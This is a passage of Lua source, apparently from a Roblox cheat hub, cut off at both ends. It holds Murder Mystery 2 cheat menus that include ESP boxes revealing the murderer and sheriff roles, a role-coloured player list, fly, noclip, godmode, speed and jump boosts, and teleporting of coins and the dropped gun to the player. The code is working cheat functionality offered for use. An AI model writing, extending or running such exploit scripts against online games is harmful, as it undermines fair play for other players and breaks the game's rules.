		KeybindsActive.TextColor3 = Color3.new(1, 0, 1)
	end
end)

Show.Name = "Show"
Show.Parent = MM2
Show.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Show.BorderColor3 = Color3.new(0, 0.607843, 1)
Show.BorderSizePixel = 5
Show.Position = UDim2.new(0, 0, 0.85799998, 0)
Show.Size = UDim2.new(0.08, 0, 0.04, 0)
Show.ZIndex = 4
Show.Font = Enum.Font.SciFi
Show.FontSize = Enum.FontSize.Size24
Show.Text = "Show ["..string.upper(hideshowguikey).."]"
Show.TextColor3 = Color3.new(0, 0.333333, 1)
Show.TextSize = 20
Show.TextWrapped = true
Show.Visible = false

Hide.Name = "Hide"
Hide.Parent = Main
Hide.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Hide.BorderColor3 = Color3.new(0, 0.607843, 1)
Hide.BorderSizePixel = 5
Hide.Position = UDim2.new(0, 0, 1.415, 0)
Hide.Size = UDim2.new(1.005, 0, 0.08, 0)
Hide.ZIndex = 4
Hide.Font = Enum.Font.SciFi
Hide.FontSize = Enum.FontSize.Size24
Hide.Text = "Hide ["..string.upper(hideshowguikey).."]"
Hide.TextColor3 = Color3.new(0, 0.333333, 1)
Hide.TextSize = 20
Hide.TextWrapped = true

Hide.MouseButton1Down:connect(function(x, y)
	if showvar == true then
		showvar = false
		Main.Visible = false
		Show.Visible = true
		if printvar == true then
			print("Hidden")
		end
	end
end)

Show.MouseButton1Down:connect(function(x, y)
	if showvar == false then
		showvar = true
		Show.Visible = false
		Main.Visible = true
		if printvar == true then
			print("Shown")
		end
	end
end)

inputcode.InputBegan:connect(function(input)
	if input.KeyCode == Enum.KeyCode.LeftControl then
		if keyOff == true then
			keyOff = false
			KeybindsActive.Text = "Active"
			KeybindsActive.TextColor3 = Color3.new(0, 1, 0)
		elseif keyOff == false then
			keyOff = true
			KeybindsActive.Text = "Inactive"
			KeybindsActive.TextColor3 = Color3.new(1, 0, 1)
		end
	end
end)

mouse.keyDown:connect(function(key)
	if keyOff == false then
		if key == coinkey then --Coin Grabber
			coingrabberfunc()
		elseif key == MSkey then --Murderer/Sheriff Esp On
			murderer = "None"
			sheriff = "None"
			Clear()
			findmurderer()
			findsheriff()
			if printvar == true then
				print("Murderer/Sheriff")
			end
			MSESPActive.Text = "Active"
			MSESPActive.TextColor3 = Color3.new(0, 1, 0)
			PlayersEspActive.Text = "Inactive"
			PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
			EspOffActive.Text = "Inactive"
			EspOffActive.TextColor3 = Color3.new(1, 0, 1)
		elseif key == playerskey then --Player Esp On
			Clear()
			MSESPActive.Text = "Inactive"
			MSESPActive.TextColor3 = Color3.new(1, 0, 1)
			PlayersEspActive.Text = "Active"
			PlayersEspActive.TextColor3 = Color3.new(0, 1, 0)
			EspOffActive.Text = "Inactive"
			EspOffActive.TextColor3 = Color3.new(1, 0, 1)
			findplayers()
			if printvar == true then
				print("Players")
			end
		elseif key == espoffkey then --Esp off
			Clear()
			if printvar == true then
				print("Esp Disabled")
			end
			MSESPActive.Text = "Inactive"
			MSESPActive.TextColor3 = Color3.new(1, 0, 1)
			PlayersEspActive.Text = "Inactive"
			PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
			EspOffActive.Text = "Active"
			EspOffActive.TextColor3 = Color3.new(0, 1, 0)
		elseif key == flykey then --Fly
			if flyvar == false then
				sFLY()
				flyvar = true
				FlyActive.Text = "Active"
				FlyActive.TextColor3 = Color3.new(0, 1, 0)
			elseif flyvar == true then
				flyvar = false
				NOFLY()
				FlyActive.Text = "Inactive"
				FlyActive.TextColor3 = Color3.new(1, 0, 1)
			end
		elseif key == noclipkey then --Noclip toggle
			if NClip == false then
				NClip = true
				if printvar == true then
					print("Noclip Enabled")
				end
				NoclipActive.Text = "Active"
				NoclipActive.TextColor3 = Color3.new(0, 1, 0)
			elseif NClip == true then
				NClip = false
				if printvar == true then
					print("Noclip Disabled")
				end
				NoclipActive.Text = "Inactive"
				NoclipActive.TextColor3 = Color3.new(1, 0, 1)
			end
		elseif key == godmodekey then --Godmode
			if godmodevar == false then
				godmodevar = true
				godmodefunc()
				GodModeActive.Text = "Active"
				GodModeActive.TextColor3 = Color3.new(0, 1, 0)
			end
		elseif key == xrayonkey then --Xray On
			GuiXrayOnActive.Text = "Active"
			GuiXrayOnActive.TextColor3 = Color3.new(0, 1, 0)
			GuiXrayOffActive.Text = "Inactive"
			GuiXrayOffActive.TextColor3 = Color3.new(1, 0, 1)
			XrayOn(obj)
		elseif key == xrayoffkey then --Xray Off
			GuiXrayOnActive.Text = "Inactive"
			GuiXrayOnActive.TextColor3 = Color3.new(1, 0, 1)
			GuiXrayOffActive.Text = "Active"
			GuiXrayOffActive.TextColor3 = Color3.new(0, 1, 0)
			XrayOff(obj)
		elseif key == bringgunkey then --Teleport Gun to You
			if game.Workspace.GunDrop.CFrame ~= nil then
				game.Workspace.GunDrop.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
			else
				if printvar == true then
					print("Gun not currently dropped")
				end
			end
		elseif key == hideshowguikey then --Show/Hide Gui
			if showvar == false then
				showvar = true
				Show.Visible = false
				Main.Visible = true
				if printvar == true then
					print("Shown")
				end
			elseif showvar == true then
				showvar = false
				Main.Visible = false
				Show.Visible = true
				if printvar == true then
					print("Hidden")
				end
			end
		end
	end
end)
end
end)

Section:NewButton("MM2 GUI 8 ", "LOOKS LIKE PC", function()
--murder mystery 2 script by niko#1809
--have fun :>

local pez = {};

pez.initiated = false;

local tabs = 0;

function pez:init()
    local nikopez = Instance.new("ScreenGui")
    local exframe = Instance.new("Frame")

    nikopez.Name = "nikopez"
    nikopez.Parent = game.CoreGui
    nikopez.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    pez.initiated = true;
end

function pez:addTab(name,text)
    if (pez.initiated) then
        local exframe = Instance.new("Frame")
        local exflabel = Instance.new("TextLabel")

        exframe.Active = true;
        exframe.Draggable = true;
        exframe.Name = name
        exframe.Parent = game.CoreGui.nikopez;
        exframe.BackgroundColor3 = Color3.new(1, 0.0941177, 0.0941177)
        exframe.BackgroundTransparency = 0.5
        exframe.BorderSizePixel = 0
        exframe.Position = UDim2.new(0.0218181908 * (tabs*5), 0, 0.0418994427, 0)
        exframe.Size = UDim2.new(0, 170, 0, 25)

        exflabel.Name = "exflabel"
        exflabel.Parent = exframe
        exflabel.BackgroundColor3 = Color3.new(1, 1, 1)
        exflabel.BackgroundTransparency = 1
        exflabel.Position = UDim2.new(0.0352941193, 0, 0, 0)
        exflabel.Size = UDim2.new(0.964705884, 0, 1, 0)
        exflabel.Font = Enum.Font.ArialBold
        exflabel.Text = text
        exflabel.TextColor3 = Color3.new(1, 1, 1)
        exflabel.TextSize = 15
        exflabel.TextStrokeTransparency = 0.40000000596046
        exflabel.TextXAlignment = Enum.TextXAlignment.Left
        tabs = tabs + 1;
    else
        print("pez not initiated!");
    end
end

function pez:addButton(tab,text,func)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local TextButton = Instance.new("TextButton");

        TextButton.Parent = game.CoreGui.nikopez[tab];
        TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
        TextButton.BackgroundTransparency = 1
        TextButton.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        TextButton.Size = UDim2.new(0.964705884, 0, 0, 25)
        TextButton.Font = Enum.Font.ArialBold
        TextButton.Text = "> "..text
        TextButton.TextColor3 = Color3.new(255,255,255)
        TextButton.TextSize = 13
        TextButton.TextStrokeTransparency = 0.40000000596046
        TextButton.TextXAlignment = Enum.TextXAlignment.Left

        TextButton.MouseButton1Click:connect(function()
            TextButton.TextColor3 = Color3.new(0,255,0)
            func();
            wait(0.5)
            TextButton.TextColor3 = Color3.new(255,255,255)
        end)
    else
        print("pez not initiated!");
    end
end

function pez:hide()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    if (v.Name ~= "playerlist") then
                        v.Visible = false;
                    end
                end
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:show()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    v.Visible = true;
                end
            end
        end
    else
        print("pez not initiated!");
    end
end
    
function pez:itemExists(tab,item)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(item)) then
                return true;
            else
                return false;
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:addLabel(tab,name,text)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = Color3.new(255,255,255)
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:addColoredLabel(tab,name,text,color)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = color
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:removeLabel(tab,name)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(name)) then
                game.CoreGui.nikopez[tab]:FindFirstChild(name):Destroy();
                local count = 1;
                for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
                    if (v.Name ~= "exflabel") then
                      v.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25);
                      count = count + 1;
                    end
                end
            end
        else
            print(tab.." not found")
        end
    else
        print("pez not initiated!");
    end
end

function pez:showTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = true;
        end
    else
        print("pez not initiated!");
    end
end

function pez:hideTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = false;
        end
    else
        print("pez not initiated!");
    end
end

function pez:clearTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:ClearAllChildren()
        end
    else
        print("pez not initiated!");
    end
end

function pez:removeTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:Destroy();
        end
    else
        print("pez not initiated!");
    end
end



function makebox(part,color)
    local yoniko = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    yoniko.Name = "yoniko"
    yoniko.Parent = part
    yoniko.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    yoniko.AlwaysOnTop = true
    yoniko.LightInfluence = 1
    yoniko.Size = UDim2.new(4, 0, 6, 0)
    
    Frame.Parent = yoniko
    Frame.BackgroundColor3 = color
    Frame.BackgroundTransparency = 0.5
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function makedot(part)
    local nikohead = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    nikohead.Name = "nikohead"
    nikohead.Parent = part
    nikohead.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    nikohead.AlwaysOnTop = true
    nikohead.LightInfluence = 1
    nikohead.Size = UDim2.new(1, 0, 1, 0)
    
    Frame.Parent = nikohead
    Frame.BackgroundColor3 = Color3.new(0,0,255);
    Frame.BackgroundTransparency = 0.20000000298023
    Frame.BorderColor3 = Color3.new(0, 0, 0)
    Frame.Rotation = 120
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function checkTeam(plr)
    local bp = plr.Backpack
    local char = plr.Character

    local x = false;
    for i,v in pairs(char:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    for i,v in pairs(bp:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    if (bp:FindFirstChild("Knife") or char:FindFirstChild("Knife")) then
        return 1;
    elseif (x) then
        return 2;
    else
        return 3;
    end
end

pez:init();

enableds = {};

espon = false;
fovon = false;

espgun = false;
espmurderer = true;
espsheriff = true;
espinnocent = false;

tpgun = false;
tpcoins = false;

noclip = false;
fly = false;
fast = false;
highjump = false;

hidden = false;

showvisuals = true;
showespsettings = true;
showmovement = true;
showitems = true;
showenableds = true;
showplayerlist = true;

pez:addTab("cheats","Enabled cheats");

function toggleesp()
    espon = not espon;
    if (espon) then
        pez:addLabel("cheats","esp","ESP");
    else
        pez:removeLabel("cheats","esp");
    end
end

function togglefov()
    fovon = not fovon;
    if (fovon) then
        pez:addLabel("cheats","fov","FOV");
    else
        pez:removeLabel("cheats","fov");
    end
end

function toggleespgun()
    espgun = not espgun;
end

function toggleespmurderer()
    espmurderer = not espmurderer;
end

function toggleespsheriff()
    espsheriff = not espsheriff;
end

function toggleespinnocent()
    espinnocent = not espinnocent;
end

function toggletpgun()
    tpgun = not tpgun;
    if (tpgun) then
        pez:addLabel("cheats","tpgun","Tp gun");
    else
        pez:removeLabel("cheats","tpgun");
    end
end

function toggletpcoins()
    tpcoins = not tpcoins;
    if (tpcoins) then
        pez:addLabel("cheats","tpcoins","Tp coins");
    else
        pez:removeLabel("cheats","tpcoins");
    end
end

function togglenoclip()
    noclip = not noclip;
    if (noclip) then
        pez:addLabel("cheats","noclip","Noclip");
    else
        pez:removeLabel("cheats","noclip");
    end
end

function tplobby()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-107,149,23))
end

--FLY SCRIPT BY RGEENEUS

local speed = 50

local c
local h
local bv
local bav
local cam
local flying
local p = game.Players.LocalPlayer
local buttons = {W = false, S = false, A = false, D = false, Moving = false}

local startFly = function () -- Call this function to begin flying 
    if not p.Character or not p.Character.Head or flying then return end
    c = p.Character
    h = c.Humanoid
    h.PlatformStand = true
    cam = workspace:WaitForChild('Camera')
    bv = Instance.new("BodyVelocity")
    bav = Instance.new("BodyAngularVelocity")
    bv.Velocity, bv.MaxForce, bv.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bav.AngularVelocity, bav.MaxTorque, bav.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bv.Parent = c.Head
    bav.Parent = c.Head
    flying = true
    h.Died:connect(function() flying = false end)
end

local endFly = function () -- Call this function to stop flying
    if not p.Character or not flying then return end
    h.PlatformStand = false
    bv:Destroy()
    bav:Destroy()
    flying = false
end

game:GetService("UserInputService").InputBegan:connect(function (input, GPE) 
    if GPE then return end
    for i, e in pairs(buttons) do
        if i ~= "Moving" and input.KeyCode == Enum.KeyCode[i] then
            buttons[i] = true
            buttons.Moving = true
        end
    end
end)

game:GetService("UserInputService").InputEnded:connect(function (input, GPE) 
    if GPE then return end
    local a = false
    for i, e in pairs(buttons) do
        if i ~= "Moving" then
            if input.KeyCode == Enum.KeyCode[i] then
                buttons[i] = false
            end
            if buttons[i] then a = true end
        end
    end
    buttons.Moving = a
end)

local setVec = function (vec)
    return vec * (speed / vec.Magnitude)
end

game:GetService("RunService").Heartbeat:connect(function (step) -- The actual fly function, called every frame
    if flying and c and c.PrimaryPart then
        local p = c.PrimaryPart.Position
        local cf = cam.CFrame
        local ax, ay, az = cf:toEulerAnglesXYZ()
        c:SetPrimaryPartCFrame(CFrame.new(p.x, p.y, p.z) * CFrame.Angles(ax, ay, az))
        if buttons.Moving then
            local t = Vector3.new()
            if buttons.W then t = t + (setVec(cf.lookVector)) end
            if buttons.S then t = t - (setVec(cf.lookVector)) end
            if buttons.A then t = t - (setVec(cf.rightVector)) end
            if buttons.D then t = t + (setVec(cf.rightVector)) end
            c:TranslateBy(t * step)
        end
    end
end)


function togglefly()
    if (fly) then
        fly = false;
        endFly()
        pez:removeLabel("cheats","fly");
    else
        fly = true;
        startFly()
        pez:addLabel("cheats","fly","Fly");
    end
end

function togglefast()
    fast = not fast;
    if (fast) then
        pez:addLabel("cheats","fast","Fast");
    else
        pez:removeLabel("cheats","fast");
    end
end

function togglejump()
    highjump = not highjump;
    if (highjump) then
        pez:addLabel("cheats","highjump","Highjump");
    else
        pez:removeLabel("cheats","highjump");
    end
end

function setday()
    local lighting = game.Lighting
    lighting.TimeOfDay = 12;
end

function setnight()
    local lighting = game.Lighting
    lighting.TimeOfDay = 22;
end

game:service'RunService'.Stepped:connect(function()
    if (noclip) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(11) end
    if (fast) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 24; else game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16; end
    if (highjump) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 120; else game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50; end
end)

function onKeyPress(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.Home then
        if (hidden) then
            print(hidden)
            hidden = false;
            pez:show();
        else
            print(hidden)
            hidden = true;
            pez:hide();
        end
	end
end

function togglevisuals()
    if (showvisuals) then
        showvisuals = false;
        pez:hideTab("visuals");
    else
        showvisuals =true;
        pez:showTab("visuals");
    end
end

function toggleespsettings()
    if (showespsettings) then
        showespsettings = false;
        pez:hideTab("espsettings");
    else
        showespsettings =true;
        pez:showTab("espsettings");
    end
end

function toggleitems()
    if (showitems) then
        showitems = false;
        pez:hideTab("items");
    else
        showitems =true;
        pez:showTab("items");
    end
end

function togglemovement()
    if (showmovement) then
        showmovement = false;
        pez:hideTab("movement");
    else
        showmovement =true;
        pez:showTab("movement");
    end
end

function toggleenableds()
    if (showenableds) then
        showenableds = false;
        pez:hideTab("cheats");
    else
        showenableds =true;
        pez:showTab("cheats");
    end
end

function toggleplayerlist()
    if (showplayerlist) then
        showplayerlist = false;
        pez:hideTab("playerlist");
    else
        showplayerlist =true;
        pez:showTab("playerlist");
    end
end
 
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

pez:addTab("gui","Gui");
pez:addLabel("gui","info","Toggle gui: Home")
pez:addButton("gui","Visuals",togglevisuals)
pez:addButton("gui","Esp settings",toggleespsettings)
pez:addButton("gui","Items",toggleitems)
pez:addButton("gui","Movement",togglemovement)
pez:addButton("gui","Enabled cheats",toggleenableds)
pez:addButton("gui","Playerlist",toggleplayerlist)

pez:addTab("visuals","Visuals");
pez:addButton("visuals","ESP",toggleesp)
pez:addButton("visuals","FOV",togglefov)
pez:addButton("visuals","Set night",setnight)
pez:addButton("visuals","Set day",setday)

pez:addTab("espsettings","Esp settings");
pez:addButton("espsettings","Show murderer",toggleespmurderer)
pez:addButton("espsettings","Show sheriff",toggleespsheriff)
pez:addButton("espsettings","Show innocents",toggleespinnocent)
pez:addButton("espsettings","Show dropped gun",toggleespgun);

pez:addTab("items","Items");
pez:addButton("items","Tp coins",toggletpcoins)
pez:addButton("items","Tp gun",toggletpgun)

pez:addTab("movement","Movement");
pez:addButton("movement","Noclip",togglenoclip)
pez:addButton("movement","Fly",togglefly)
pez:addButton("movement","Fast",togglefast)
pez:addButton("movement","Highjump",togglejump)
pez:addButton("movement","Tp to lobby",tplobby)

pez:addTab("playerlist","Playerlist")

pez:addTab("credits","Credits");
pez:addLabel("credits","nikoo","niko#1809")

print("press Home to toggle the gui");
print("mm2 script by niko#1809 / lekolar2 ;)")

local cor = coroutine.wrap(function()
    while(true) do
        wait(1)
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (pez:itemExists("playerlist",v.Name)) then
                    pez:removeLabel("playerlist",v.Name)
                end

                local team = checkTeam(v);

                if (team == 1) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(255,0,0))
                elseif (team == 2) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,0,255))
                else
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,255,0))
                end
            end
        end
    end
end)

cor();

x = 0;

while(true)do
    if (x == 200) then pez:removeTab("credits"); else x = x + 1; end
    wait();
    if (fovon) then
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 100;
    else
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 70;
    end
    if (tpcoins) then
        for i,v in pairs(workspace:GetChildren()) do
            if (v:FindFirstChild("CoinContainer")) then
                for w,g in pairs(v.CoinContainer:GetChildren()) do
                    g.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                end
            end
        end
    end
    if (tpgun) then
        if (workspace:FindFirstChild("GunDrop")) then
            workspace.GunDrop.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        end
    end
    if (espon) then
        if (espgun) then
            if (workspace:FindFirstChild("GunDrop")) then
                if (workspace.GunDrop:FindFirstChild("nikohead")) then
                    workspace.GunDrop.nikohead:Destroy()
                end
                makedot(workspace.GunDrop);
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (v.Character:WaitForChild("HumanoidRootPart")) then
                    if (v~=game.Players.LocalPlayer) then
                        if (v.Character:WaitForChild("HumanoidRootPart"):FindFirstChild("yoniko")) then
                            v.Character:WaitForChild("HumanoidRootPart").yoniko:Destroy()
                        end
                        local team = checkTeam(v)

                        if (team == 1) then
                            if (espmurderer) then makebox(v.Character.HumanoidRootPart,Color3.new(255,0,0)); end
                        elseif (team == 2) then
                            if (espsheriff) then makebox(v.Character.HumanoidRootPart,Color3.new(0,0,255)); end
                        else
                            if (espinnocent) then makebox(v.Character.HumanoidRootPart,Color3.new(0,255,0)); end
                        end
                    end
                end
            end
        end
    end
end
end)

Section:NewButton("MM2 GUI 9 ", "Idk what to say lol", function()
--murder mystery 2 script by niko#1809
--have fun :>

local pez = {};

pez.initiated = false;

local tabs = 0;

function pez:init()
    local nikopez = Instance.new("ScreenGui")
    local exframe = Instance.new("Frame")

    nikopez.Name = "nikopez"
    nikopez.Parent = game.CoreGui
    nikopez.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    pez.initiated = true;
end

function pez:addTab(name,text)
    if (pez.initiated) then
        local exframe = Instance.new("Frame")
        local exflabel = Instance.new("TextLabel")

        exframe.Active = true;
        exframe.Draggable = true;
        exframe.Name = name
        exframe.Parent = game.CoreGui.nikopez;
        exframe.BackgroundColor3 = Color3.new(1, 0.0941177, 0.0941177)
        exframe.BackgroundTransparency = 0.5
        exframe.BorderSizePixel = 0
        exframe.Position = UDim2.new(0.0218181908 * (tabs*5), 0, 0.0418994427, 0)
        exframe.Size = UDim2.new(0, 170, 0, 25)

        exflabel.Name = "exflabel"
        exflabel.Parent = exframe
        exflabel.BackgroundColor3 = Color3.new(1, 1, 1)
        exflabel.BackgroundTransparency = 1
        exflabel.Position = UDim2.new(0.0352941193, 0, 0, 0)
        exflabel.Size = UDim2.new(0.964705884, 0, 1, 0)
        exflabel.Font = Enum.Font.ArialBold
        exflabel.Text = text
        exflabel.TextColor3 = Color3.new(1, 1, 1)
        exflabel.TextSize = 15
        exflabel.TextStrokeTransparency = 0.40000000596046
        exflabel.TextXAlignment = Enum.TextXAlignment.Left
        tabs = tabs + 1;
    else
        print("pez not initiated!");
    end
end

function pez:addButton(tab,text,func)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local TextButton = Instance.new("TextButton");

        TextButton.Parent = game.CoreGui.nikopez[tab];
        TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
        TextButton.BackgroundTransparency = 1
        TextButton.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        TextButton.Size = UDim2.new(0.964705884, 0, 0, 25)
        TextButton.Font = Enum.Font.ArialBold
        TextButton.Text = "> "..text
        TextButton.TextColor3 = Color3.new(255,255,255)
        TextButton.TextSize = 13
        TextButton.TextStrokeTransparency = 0.40000000596046
        TextButton.TextXAlignment = Enum.TextXAlignment.Left

        TextButton.MouseButton1Click:connect(function()
            TextButton.TextColor3 = Color3.new(0,255,0)
            func();
            wait(0.5)
            TextButton.TextColor3 = Color3.new(255,255,255)
        end)
    else
        print("pez not initiated!");
    end
end

function pez:hide()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    if (v.Name ~= "playerlist") then
                        v.Visible = false;
                    end
                end
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:show()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    v.Visible = true;
                end
            end
        end
    else
        print("pez not initiated!");
    end
end
    
function pez:itemExists(tab,item)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(item)) then
                return true;
            else
                return false;
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:addLabel(tab,name,text)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = Color3.new(255,255,255)
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:addColoredLabel(tab,name,text,color)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = color
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:removeLabel(tab,name)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(name)) then
                game.CoreGui.nikopez[tab]:FindFirstChild(name):Destroy();
                local count = 1;
                for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
                    if (v.Name ~= "exflabel") then
                      v.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25);
                      count = count + 1;
                    end
                end
            end
        else
            print(tab.." not found")
        end
    else
        print("pez not initiated!");
    end
end

function pez:showTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = true;
        end
    else
        print("pez not initiated!");
    end
end

function pez:hideTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = false;
        end
    else
        print("pez not initiated!");
    end
end

function pez:clearTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:ClearAllChildren()
        end
    else
        print("pez not initiated!");
    end
end

function pez:removeTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:Destroy();
        end
    else
        print("pez not initiated!");
    end
end



function makebox(part,color)
    local yoniko = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    yoniko.Name = "yoniko"
    yoniko.Parent = part
    yoniko.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    yoniko.AlwaysOnTop = true
    yoniko.LightInfluence = 1
    yoniko.Size = UDim2.new(4, 0, 6, 0)
    
    Frame.Parent = yoniko
    Frame.BackgroundColor3 = color
    Frame.BackgroundTransparency = 0.5
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function makedot(part)
    local nikohead = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    nikohead.Name = "nikohead"
    nikohead.Parent = part
    nikohead.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
